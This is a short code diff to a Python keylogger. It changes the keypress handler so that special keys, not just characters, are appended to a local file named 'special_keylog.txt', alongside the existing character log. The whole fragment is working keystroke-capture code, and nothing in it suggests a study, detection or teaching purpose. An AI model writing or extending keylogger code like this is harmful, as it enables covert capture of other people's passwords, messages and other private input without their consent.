@@ -6,8 +6,11 @@ def keyPressed(key):
         try:
            char = key.char
            logkey.write(char)
-        except:
-            print("Error getting char") 
+        except AttributeError:
+            with open("special_keylog.txt", 'a') as special_key:
+                special_key.write('Special key {0} pressed, '.format(key))
+
+
 
 if __name__=="__main__":
     listener = keyboard.Listener(on_press=keyPressed)
